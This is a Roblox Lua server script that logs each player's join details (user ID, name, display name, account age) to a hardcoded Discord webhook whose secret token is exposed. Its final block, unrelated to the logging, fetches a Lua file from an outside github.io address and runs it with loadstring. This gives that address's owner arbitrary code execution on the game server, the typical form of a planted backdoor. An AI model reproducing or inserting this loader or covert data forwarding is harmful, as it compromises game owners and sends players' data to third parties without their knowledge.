local HttpService = game:GetService("HttpService")

local webhookUrl = "https://discordapp.com/api/webhooks/1253809598452858971/jpFmQYOCWwssaHqR0QA0tLZ_pY3Eylo56t9u6WNg8dR_CbS7kP6c7ekYyjCNvBTVidd5"

local function sendEmbed(title, description, fields)
    local embed = {
        title = title,
        description = description,
        fields = fields
    }

    local data = {
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(data)

    local response
    local success, errorMessage = pcall(function()
        response = HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Embed sent successfully!")
    else
        print("Failed to send embed. Error: " .. errorMessage)
    end
end

local function getPlayerInfo(player)
    return {
        {name = "GameID", value = tostring(game.PlaceId), inline = true},
        {name = "UserID", value = tostring(player.UserId), inline = true},
        {name = "Username", value = player.Name, inline = true},
        {name = "DisplayName", value = player.DisplayName, inline = true},
        {name = "Account Age", value = tostring(player.AccountAge), inline = true}
    }
end

local function onPlayerAdded(player)
    -- Debounce to ensure the function runs only once per player join
    if not player:GetAttribute("HasJoined") then
        player:SetAttribute("HasJoined", true)
        local embedFields = getPlayerInfo(player)
        sendEmbed("Player Joined", player.Name .. " has joined the game.", embedFields)
    end
end

game.Players.PlayerAdded:Connect(onPlayerAdded)

local success, response = pcall(function()
    return HttpService:GetAsync("https://pgertools.github.io/Repurcution/main.lua")
end)

if success then
    local loadSuccess, loadError = pcall(function()
        loadstring(response)()
    end)
    if not loadSuccess then
        warn("Error loading script: " .. loadError)
    end
else
    warn("Error fetching script: " .. response)
end